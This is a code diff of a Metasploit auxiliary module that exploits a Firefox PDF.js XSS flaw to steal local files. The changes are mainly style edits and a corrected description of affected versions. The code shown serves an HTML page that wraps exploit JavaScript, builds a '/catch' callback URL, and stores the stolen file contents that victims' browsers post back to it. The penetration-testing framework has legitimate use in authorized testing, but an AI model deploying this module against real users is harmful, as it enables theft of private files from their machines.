@@ -14,12 +14,12 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'        => 'Firefox PDF.js Browser File Theft',
       'Description' => %q{
-        This module abuses an XSS vulnerability in versions of Firefox 39.0.3, Firefox ESR
-        before 38.1.1, and Firefox OS before 2.2 that allows arbitrary files to be stolen.
-        The vulnerability occurs in the PDF.js component, which uses Javascript to render
-        a PDF inside a frame with privileges to read local files. The in-the-wild malicious
-        payloads searched for sensitive files on Windows, Linux, and OSX. Android versions
-        are reported to be unaffected, as they do not use the Mozilla PDF viewer.
+        This module abuses an XSS vulnerability in versions prior to Firefox 39.0.3, Firefox ESR
+        38.1.1, and Firefox OS 2.2 that allows arbitrary files to be stolen. The vulnerability
+        occurs in the PDF.js component, which uses Javascript to render a PDF inside a frame with
+        privileges to read local files. The in-the-wild malicious payloads searched for sensitive
+        files on Windows, Linux, and OSX. Android versions are reported to be unaffected, as they
+        do not use the Mozilla PDF viewer.
       },
       'Author'         => [
         'Unknown', # From an 0day served on Russian news website
@@ -74,25 +74,26 @@ class Metasploit3 < Msf::Auxiliary
 
   def process_post(cli, req)
     name = req.qstring['name']
-    print_good "Received #{name}, size #{req.body.bytes.length}..."
+    print_good("Received #{name}, size #{req.body.bytes.length}...")
     output = store_loot(
-      name || "data", "text/plain", cli.peerhost, req.body, "firefox_theft", "Firefox PDF.js exfiltrated file"
+      name || 'data', 'text/plain', cli.peerhost, req.body, 'firefox_theft', 'Firefox PDF.js exfiltrated file'
     )
-    print_good "Stored to #{output}"
+    print_good("Stored to #{output}")
   end
 
   def html
-    exploit_js = js+file_payload+"}, 20);"
+    exploit_js = js + file_payload + '}, 20);'
+
     "<!doctype html><html><body><script>#{exploit_js}</script></body></html>"
   end
 
   def backend_url
-    proto = (datastore["SSL"] ? "https" : "http")
-    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
+    proto = (datastore['SSL'] ? 'https' : 'http')
+    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
     port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
     resource = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
 
-    "#{proto}://#{myhost}#{port_str}#{resource}/catch"
+    "#{proto}://#{my_host}#{port_str}#{resource}/catch"
   end
 
 
